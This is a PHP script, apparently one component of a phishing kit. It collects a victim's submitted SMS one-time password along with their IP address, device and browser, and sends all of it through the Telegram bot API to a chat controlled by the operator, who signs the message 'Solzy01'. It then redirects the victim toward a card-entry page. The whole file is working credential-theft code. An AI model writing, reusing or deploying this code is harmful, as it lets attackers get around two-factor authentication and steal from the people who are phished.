<?php 
include'./config.php';
include'./agent.php';
$ip = getenv("REMOTE_ADDR");
$otp = $_POST['otp'];
if (!empty($otp)) {
	$coronamsg .= "[⚜️] ┏━ [ $ip ] ━┓[⚜️]\n";
	$coronamsg .= "[🔑] SMS : $otp\n";
	$coronamsg .= "[🔅] ᴅᴇᴠɪᴄᴇ : $user_os\n";
	$coronamsg .= "[🔅] ʙʀᴏᴡsᴇʀ : $user_browser\n";
	$coronamsg .= "[⚜️] By Solzy01\n";
	$token = "$coronatoken";
    $data = [
    'text' => $coronamsg,
    'chat_id' => $coronachat,
    ];file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
    header("Location: ./wait.php?next=card.php");
}
else{
	header('Location: ./index.php');
}?>
